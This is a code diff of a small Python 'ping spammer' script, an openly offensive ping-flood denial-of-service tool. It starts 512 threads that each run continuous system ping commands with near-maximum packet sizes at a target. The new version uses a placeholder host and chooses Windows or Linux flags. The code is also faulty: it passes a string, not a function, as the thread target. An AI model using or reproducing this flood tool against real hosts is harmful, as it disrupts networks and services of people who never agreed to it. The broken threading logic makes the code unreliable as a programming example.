@@ -1,9 +1,13 @@
 import os
 import threading
-def ping(addy):
-    os.system(f"ping {addy} -s 65507")
-print("ping spammer??"+(5000*'[]'))
-addy = input("enter target:")
+def Wping():
+    os.system(f"ping ATTACKTARGETHERE -t -l 65500")
+def Lping():
+    os.system(f"ping ATTACKTARGETHERE -s 65500")
+#print("ping spammer??"+(5000*'[]'))
+option = 'Lping'
+if os.name == 'nt':
+    option = 'Wping'
 for i in range(512):
-    thead = threading.Thread(target=ping(addy),name=f'TH{i}')
+    thead = threading.Thread(target=f'{option}',name=f'TH{i}')
     thead.start()
